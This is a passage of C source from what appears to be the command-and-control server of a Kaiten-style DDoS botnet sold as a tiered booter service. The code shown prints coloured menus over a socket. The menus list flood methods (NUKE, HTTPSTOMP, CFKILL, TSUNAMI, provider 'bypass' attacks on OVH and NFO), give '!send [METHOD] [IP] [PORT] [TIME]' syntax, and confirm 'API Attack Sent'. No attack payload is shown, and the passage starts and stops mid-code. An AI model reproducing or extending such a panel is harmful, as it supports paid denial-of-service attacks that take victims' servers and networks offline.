	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];  // remake this shitty plans hub
        char p6  [800];  //  Shitttt mannnn Still gotta make da hubbb
        char p7  [800];
        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

        sprintf(p2,   "\e[38;2;255;0;211m╔════\e[38;2;199;53;221m═════\e[38;2;143;106;231m═════\e[38;2;88;159;240m══════════════════════════════════╗ \r\n");
        sprintf(p3,   "\e[38;2;255;0;211m Norma\e[38;2;199;53;221ml | M\e[38;2;143;106;231maxtim\e[38;2;88;159;240me: 600s | Cooldown: 450s | 100%   \r\n");
        sprintf(p4,   "\e[38;2;255;0;211m VIP   \e[38;2;199;53;221m | Ma\e[38;2;143;106;231mxtime\e[38;2;88;159;240m: 1300s| Cooldown: 350s | 100%   \r\n");
        sprintf(p5,   "\e[38;2;255;0;211m PRO    \e[38;2;199;53;221m| Max\e[38;2;143;106;231mtime:\e[38;2;88;159;240m 2100s| Cooldown: 250s | 95.8%  \r\n");
        sprintf(p6,   "\e[38;2;255;0;211m GODLY  |\e[38;2;199;53;221m Maxt\e[38;2;143;106;231mime: \e[38;2;88;159;240m3600s| Cooldown: 150s | 99.7%  \r\n");
        sprintf(p7,   "\e[38;2;255;0;211m╚═════════\e[38;2;199;53;221m═════\e[38;2;143;106;231m═════\e[38;2;88;159;240m═════════════════════════════╝\r\n");

      
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
    }

            if(strstr(buf, "downnnnnned") || strstr(buf, "DOWNED") || strstr(buf, "KILLEZERSDEFW")) {
                	  			send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];
        char ls7  [800];
        char ls8  [800];
        char ls9  [800];            
        char ls10  [800];  // \e[37m
        char ls11  [800];


        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m


                sprintf(ls1,   "\e[38;2;255;0;211m ╔═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══╗╔══\e[38;2;171;80;226m══════\e[38;2;143;106;231m═════╗\e[38;2;116;133;235m╔═════\e[38;2;88;159;240m════════╗\r\n");
                sprintf(ls2,   "\e[38;2;255;0;211m ║    AP\e[38;2;227;27;216mI I   \e[38;2;199;53;221m ║║   \e[38;2;171;80;226m API I\e[38;2;143;106;231mI   ║║\e[38;2;116;133;235m    AP\e[38;2;88;159;240mI III  ║\r\n");
                sprintf(ls3,   "\e[38;2;255;0;211m ╠═══════\e[38;2;227;27;216m══════\e[38;2;199;53;221m╣╠════\e[38;2;171;80;226m══════\e[38;2;143;106;231m═══╣╠═\e[38;2;116;133;235m══════\e[38;2;88;159;240m══════╣\r\n");
                sprintf(ls4,   "\e[38;2;255;0;211m ║    NUKE\e[38;2;227;27;216m     ║\e[38;2;199;53;221m║    1\e[38;2;171;80;226m00UP  \e[38;2;143;106;231m  ║║  \e[38;2;116;133;235m  UBNT\e[38;2;88;159;240m     ║\r\n");
                sprintf(ls5,   "\e[38;2;255;0;211m ║    ZAP  \e[38;2;227;27;216m    ║║\e[38;2;199;53;221m    KI\e[38;2;171;80;226mLLALL \e[38;2;143;106;231m ║║   \e[38;2;116;133;235m DVR  \e[38;2;88;159;240m    ║\r\n");
                sprintf(ls6,   "\e[38;2;255;0;211m ║    CNN   \e[38;2;227;27;216m   ║║ \e[38;2;199;53;221m   RIP\e[38;2;171;80;226m      \e[38;2;143;106;231m║║    \e[38;2;116;133;235mBEAMED\e[38;2;88;159;240m   ║\r\n");
                sprintf(ls7,   "\e[38;2;255;0;211m ║    DEATH  \e[38;2;227;27;216m  ║║  \e[38;2;199;53;221m  SMAS\e[38;2;171;80;226mH    ║\e[38;2;143;106;231m║    S\e[38;2;116;133;235mTUN-X \e[38;2;88;159;240m  ║\r\n");
                sprintf(ls8,   "\e[38;2;255;0;211m ╚════════════\e[38;2;227;27;216m═╝╚═══\e[38;2;199;53;221m══════\e[38;2;171;80;226m════╝╚\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═╝\r\n");
                sprintf(ls9,   "\e[38;2;255;0;211m \e[38;2;255;0;211m(\e[38;2;227;27;216m\__\e[38;2;199;53;221m/\e[38;2;171;80;226m) \r\n");
                sprintf(ls10,  "\e[38;2;255;0;211m \e[38;2;143;106;231m(\e[38;2;116;133;235m•\e[38;2;88;159;240mㅅ\e[38;2;255;0;211m•\e[38;2;227;27;216m)\e[37m Usage:  !send [Method] [IP] [PORT] [TIME]\r\n");
                sprintf(ls11,  "\e[38;2;255;0;211m \e[38;2;199;53;221m/ 　 \e[38;2;171;80;226mづ \e[37mMax Time: 300 seconds [Example: !send NUKE 1.1.1.1 443 120]\r\n");

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls10,  strlen(ls10),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls11,  strlen(ls11),  MSG_NOSIGNAL) == -1) goto end;
    }

if (strcasestr(buf, "!send")){ 
char ls1  [800];
sprintf(ls1,   "\e[1;35m[Kaiten]: \e[1;36mAPI Attack \e[1;32mSent\r\n");
if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
}

        if(strstr(buf, "BYPASS") || strstr(buf, "Bypass") || strstr(buf, "bypass") || strstr(buf, "BYPAS") || strstr(buf, "bypas") || strstr(buf, "ByPass")) {
                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p1  [800];
        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];
        char p6  [800];
        char p7  [800];
                char p8  [800];
                char p9  [800];


        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m


                sprintf(p1,   "\e[38;2;255;0;211m ╔═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═══════╗\r\n");
                sprintf(p2,   "\e[38;2;255;0;211m ║!* HTT\e[38;2;227;27;216mPSTOMP\e[38;2;199;53;221m GET [\e[38;2;171;80;226mIP] [P\e[38;2;143;106;231mORT] /\e[38;2;116;133;235m [TIME\e[38;2;88;159;240m] 1024║\r\n");
                sprintf(p3,   "\e[38;2;255;0;211m ║!* CFKI\e[38;2;227;27;216mLL GET\e[38;2;199;53;221m [IP] \e[38;2;171;80;226m[PORT]\e[38;2;143;106;231m / [TI\e[38;2;116;133;235mME] 10\e[38;2;88;159;240m24   ║\r\n");
                sprintf(p4,   "\e[38;2;255;0;211m ║!* NULL-\e[38;2;227;27;216mCF GET\e[38;2;199;53;221m [IP] \e[38;2;171;80;226m[PORT]\e[38;2;143;106;231m / [TIM\e[38;2;116;133;235mE] 102\e[38;2;88;159;240m4  ║\r\n");
                sprintf(p5,   "\e[38;2;255;0;211m ║!* BLAZIN\e[38;2;227;27;216mGFAST \e[38;2;199;53;221m[IP] [\e[38;2;171;80;226m443] [\e[38;2;143;106;231mTIME]  \e[38;2;116;133;235m      \e[38;2;88;159;240m  ║\r\n"); 
                sprintf(p6,   "\e[38;2;255;0;211m ║!* WIX [IP\e[38;2;227;27;216m] [POR\e[38;2;199;53;221mT] [TI\e[38;2;171;80;226mME]   \e[38;2;143;106;231m       \e[38;2;116;133;235m      \e[38;2;88;159;240m ║\r\n");
                sprintf(p7,   "\e[38;2;255;0;211m ║!* VPS [IP]\e[38;2;227;27;216m [22] \e[38;2;199;53;221m[TIME]\e[38;2;171;80;226m 10   \e[38;2;143;106;231m       \e[38;2;116;133;235m      \e[38;2;88;159;240m║\r\n");  // fix vps method
                sprintf(p8,   "\e[38;2;255;0;211m ║!* HOME [IP]\e[38;2;227;27;216m [PORT\e[38;2;199;53;221m] [TIM\e[38;2;171;80;226mE]    \e[38;2;143;106;231m       \e[38;2;116;133;235m     ║\r\n");
                sprintf(p9,   "\e[38;2;255;0;211m ╚═════════════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m═══════\e[38;2;116;133;235m════╝\r\n");

      
        if(send(datafd, p1,  strlen(p1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
    }


        if(strstr(buf, "extra") || strstr(buf, "EXTRA") || strstr(buf, "Extra")) {
                        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800]; // \e[1;36m    
        char ls7  [800]; // \e[37m
        char ls8  [800];
        char ls9  [800];
        char ls10  [800];
        char ls11  [800];
        char ls12  [800];

        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

 sprintf(ls1,   "\e[38;2;88;159;240m                                          ╔═══════╗\r\n");
 sprintf(ls2,   "\e[38;2;255;0;211m +--^--\e[38;2;227;27;216m------\e[38;2;199;53;221m--,---\e[38;2;171;80;226m-----,\e[38;2;143;106;231m-----,\e[38;2;116;133;235m------\e[38;2;88;159;240m-^-, ║HOLD   ║\r\n");
 sprintf(ls3,   "\e[38;2;255;0;211m | |||||\e[38;2;227;27;216m||||  \e[38;2;199;53;221m `----\e[38;2;171;80;226m----' \e[38;2;143;106;231m    | \e[38;2;116;133;235m      \e[38;2;88;159;240m  O ║JUNK   ║\r\n");
 sprintf(ls4,   "\e[38;2;255;0;211m `+------\e[38;2;227;27;216m------\e[38;2;199;53;221m------\e[38;2;171;80;226m------\e[38;2;143;106;231m---^--\e[38;2;116;133;235m------\e[38;2;88;159;240m-| ║CNC    ║\r\n");
 sprintf(ls5,   "\e[38;2;255;0;211m   `\_,---\e[38;2;227;27;216m------\e[38;2;199;53;221m,-----\e[38;2;171;80;226m----,-\e[38;2;143;106;231m------\e[38;2;116;133;235m------\e[38;2;88;159;240m'  ║REDSYN ║\r\n");
 sprintf(ls6,   "\e[38;2;255;0;211m     / XXXX\e[38;2;227;27;216mXX /'|\e[38;2;199;53;221m|     \e[38;2;171;80;226m/'    \e[38;2;143;106;231m      \e[38;2;116;133;235m      \e[38;2;88;159;240m ║TSUNAMI║\r\n");
 sprintf(ls7,   "\e[38;2;255;0;211m    / XXXXXX\e[38;2;227;27;216m /  `\\ \e[38;2;199;53;221m  /'\e[38;2;171;80;226m      \e[38;2;143;106;231m      \e[38;2;116;133;235m      \e[38;2;88;159;240m ║COMBO  ║\r\n");
 sprintf(ls8,   "\e[38;2;255;0;211m   / XXXXXX /\e[38;2;227;27;216m`------\e[38;2;199;53;221m-'   \e[38;2;171;80;226m      \e[38;2;143;106;231m      \e[38;2;116;133;235m     ╚\e[38;2;88;159;240m═══════╝\r\n");
 sprintf(ls9,   "\e[38;2;255;0;211m  / XXXXXX /╔═\e[38;2;227;27;216m═══════\e[38;2;199;53;221m═════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m══════╗\r\n");
 sprintf(ls10,  "\e[38;2;255;0;211m / XXXXXX / ║Us\e[38;2;227;27;216mage: !*\e[38;2;199;53;221m [MET\e[38;2;171;80;226mHOD] [\e[38;2;143;106;231mIP] [P\e[38;2;116;133;235mORT] [\e[38;2;88;159;240mTIME]║\r\n");
 sprintf(ls11,  "\e[38;2;255;0;211m(________(  ║Tsu\e[38;2;227;27;216mnami: !\e[38;2;199;53;221m* TSU\e[38;2;171;80;226mNAMI [\e[38;2;143;106;231mIP] [T\e[38;2;116;133;235mIME]  \e[38;2;88;159;240m    ║\r\n");
 sprintf(ls12,  "\e[38;2;255;0;211m `------'   ╚════\e[38;2;227;27;216m═══════\e[38;2;199;53;221m═════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═══╝\r\n");

    

        if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls10,  strlen(ls10),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls11,  strlen(ls11),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls12,  strlen(ls12),  MSG_NOSIGNAL) == -1) goto end;
    }


            if(strstr(buf, "EXPLOITS") || strstr(buf, "exploits") || strstr(buf, "exploit")) {
                                send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];        // \e[37m
        char ls7  [800];
                char ls8  [800];
                char ls9 [800];

        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                 
sprintf(ls1,   "\e[38;2;255;0;211m         ╔═\e[38;2;227;27;216m╗═\e[38;2;199;53;221m╗ \e[38;2;171;80;226m╦╔\e[38;2;143;106;231m═╗\e[38;2;116;133;235m╦ \e[38;2;88;159;240m ╔═╗╦╔╦╗╔═╗\r\n");
sprintf(ls2,   "\e[38;2;255;0;211m         ║╣ \e[38;2;227;27;216m╔╩\e[38;2;199;53;221m╦╝\e[38;2;171;80;226m╠═\e[38;2;143;106;231m╝║\e[38;2;116;133;235m  \e[38;2;88;159;240m║ ║║ ║ ╚═╗\r\n");
sprintf(ls3,   "\e[38;2;255;0;211m         ╚═╝╩\e[38;2;227;27;216m ╚\e[38;2;199;53;221m═╩\e[38;2;171;80;226m  \e[38;2;143;106;231m╩═\e[38;2;116;133;235m╝╚\e[38;2;88;159;240m═╝╩ ╩ ╚═╝       \r\n");   
sprintf(ls4,   "\e[38;2;255;0;211m ╔════════════\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;88;159;240m════════════════╗\r\n");
sprintf(ls5,   "\e[38;2;255;0;211m ║!* SERVER-1 [\e[38;2;227;27;216mIP\e[38;2;199;53;221m] \e[38;2;171;80;226m[P\e[38;2;143;106;231mOR\e[38;2;116;133;235mT]\e[38;2;88;159;240m [TIME] = HOMES║\r\n");
sprintf(ls6,   "\e[38;2;255;0;211m ║!* NUM-B [IP] \e[38;2;227;27;216m[P\e[38;2;199;53;221mOR\e[38;2;171;80;226mT]\e[38;2;143;106;231m [\e[38;2;116;133;235mTI\e[38;2;88;159;240mME] 1604 = NFO║\r\n");
sprintf(ls7,   "\e[38;2;255;0;211m ║!* AP-O [IP] [P\e[38;2;227;27;216mOR\e[38;2;199;53;221mT]\e[38;2;171;80;226m [\e[38;2;143;106;231mTI\e[38;2;116;133;235mME\e[38;2;88;159;240m] 1024 = OVH ║\r\n");     // fix colors
sprintf(ls8,   "\e[38;2;255;0;211m ║!* WSD [IP] [POR\e[38;2;227;27;216mT]\e[38;2;199;53;221m [\e[38;2;171;80;226mTI\e[38;2;143;106;231mME\e[38;2;116;133;235m] \e[38;2;88;159;240m1337 = OVH  ║\r\n");
sprintf(ls9,   "\e[38;2;255;0;211m ╚═════════════════\e[38;2;227;27;216m══\e[38;2;199;53;221m══\e[38;2;171;80;226m══\e[38;2;143;106;231m══\e[38;2;116;133;235m══\e[38;2;88;159;240m═══════════╝\r\n");
 

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls6,  strlen(ls6),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls7,  strlen(ls7),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls8,  strlen(ls8),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls9,  strlen(ls9),  MSG_NOSIGNAL) == -1) goto end;
    }


        if(strstr(buf, "SERVER") || strstr(buf, "server") || strstr(buf, "Servr")) {
                                        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;				
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char ls1  [800];
        char ls2  [800];
        char ls3  [800];
        char ls4  [800];
        char ls5  [800];
        char ls6  [800];
        char ls7  [800];
                char ls8  [800];
                char ls9 [800];
                char ls10 [800];
                char ls11 [800];
                char ls12 [800];
                char ls13 [800];
                char ls14 [800];

        //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                 
sprintf(ls1,   "\e[38;2;255;0;211m      \e[38;2;227;27;216m      \e[38;2;199;53;221m      \e[38;2;171;80;226m ╔════\e[38;2;143;106;231m══════\e[38;2;116;133;235m════╗                                       \r\n");
sprintf(ls2,   "\e[38;2;255;0;211m ╔═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m╝Serve\e[38;2;143;106;231mr Meth\e[38;2;116;133;235mods╚═════════════════╗                     \r\n");
sprintf(ls3,   "\e[38;2;255;0;211m ║ From \e[38;2;227;27;216mKaiten\e[38;2;199;53;221m-API  \e[38;2;171;80;226m      \e[38;2;143;106;231m      \e[38;2;116;133;235m From Primitive-API ║                     \r\n");
sprintf(ls4,   "\e[38;2;255;0;211m ╚═══════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m═══════════════════╝                     \r\n");
sprintf(ls5,   "\e[38;2;255;0;211m  ╔═══════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══╗   \e[38;2;171;80;226m      \e[38;2;143;106;231m      \e[38;2;116;133;235m ╔═══════════════╗                      \r\n");
sprintf(ls6,   "\e[38;2;255;0;211m  ║   ZOOM-\e[38;2;227;27;216mRAPE  \e[38;2;199;53;221m ║    \e[38;2;171;80;226m      \e[38;2;143;106;231m      \e[38;2;116;133;235m║   HTTP-LINE   ║                      \r\n");
sprintf(ls7,   "\e[38;2;255;0;211m  ║   TEAMS-\e[38;2;227;27;216mCALL  \e[38;2;199;53;221m║     \e[38;2;171;80;226m      \e[38;2;143;106;231m     ║\e[38;2;116;133;235m   HTTP-GET    ║                      \r\n");
sprintf(ls8,   "\e[38;2;255;0;211m  ║   ABUSE-V\e[38;2;227;27;216m2    ║\e[38;2;199;53;221m      \e[38;2;171;80;226m      \e[38;2;143;106;231m    ║ \e[38;2;116;133;235m  HTTP-POST   ║                      \r\n");
sprintf(ls9,   "\e[38;2;255;0;211m  ║   HTTP-PRO\e[38;2;227;27;216mXY  ║ \e[38;2;199;53;221m      \e[38;2;171;80;226m      \e[38;2;143;106;231m   ║  \e[38;2;116;133;235m HTTP-ALL    ║                      \r\n");
sprintf(ls10,  "\e[38;2;255;0;211m  ║   CF-KILL  \e[38;2;227;27;216m   ║  \e[38;2;199;53;221m      \e[38;2;171;80;226m      \e[38;2;143;106;231m  ║   \e[38;2;116;133;235mHTTP-PROXY  ║                      \r\n");
sprintf(ls11,  "\e[38;2;255;0;211m  ╚═════════════\e[38;2;227;27;216m══╝   \e[38;2;199;53;221m      \e[38;2;171;80;226m      \e[38;2;143;106;231m ╚════\e[38;2;116;133;235m═══════════╝                      \r\n");
sprintf(ls12,  "\e[1;37m           Prefix: !send [METHOD] [IP] [PORT] [TIME] [KTN/PRIM]                     \r\n");
sprintf(ls13,  "\e[1;31m           Note: If you choose a method from Kaiten pick KTN                        \r\n");
sprintf(ls14,  "\e[1;31m           Note: If you choose a Method from Primitive pick PRIM                    \r\n");

                if(send(datafd, ls1,  strlen(ls1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls2,  strlen(ls2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls3,  strlen(ls3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls4,  strlen(ls4),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ls5,  strlen(ls5),  MSG_NOSIGNAL) == -1) goto end;
